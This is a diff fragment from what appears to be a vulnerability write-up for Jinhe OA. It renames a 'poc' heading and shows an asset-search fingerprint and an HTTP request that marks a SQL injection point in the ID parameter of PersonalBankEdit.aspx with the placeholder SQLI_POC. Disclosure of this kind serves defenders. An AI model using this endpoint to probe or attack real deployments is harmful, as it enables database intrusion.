@@ -11,7 +11,7 @@
 app="金和网络-金和OA"
 ```
 
-## poc
+## POC
 ```
 GET /c6/Jhsoft.Web.CostControl/PersonalBankEdit.aspx/?ID=SQLI_POC HTTP/1.1
 Host: *
